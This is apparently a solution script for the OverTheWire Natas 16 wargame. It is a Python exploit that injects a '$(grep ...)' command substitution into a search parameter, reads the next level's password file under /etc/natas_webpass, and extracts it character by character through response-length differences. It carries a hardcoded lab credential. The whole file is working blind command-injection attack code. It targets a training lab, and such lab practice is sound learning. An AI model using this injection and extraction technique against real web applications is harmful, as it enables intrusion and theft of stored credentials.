#!/usr/bin/python3

import requests
from string import ascii_lowercase, ascii_uppercase, digits

charset = ascii_lowercase + ascii_uppercase + digits
s = requests.Session()

s.auth = ('natas16', 'hPkjKYviLQctEW33QmuXL6eDVfMW4sGo')

password = ""

while len(password) < 32:
	for char in charset:
		payload = {'needle': '$(grep -E ^%s.* /etc/natas_webpass/natas17)' % (password + char)}
		r = s.get('http://natas16.natas.labs.overthewire.org/index.php', params=payload)
		

		if len(r.text) == 1105:  #Condition is TRUE
			password += char
			print("[*] Found so far: ", password)
			break

print(password)
		
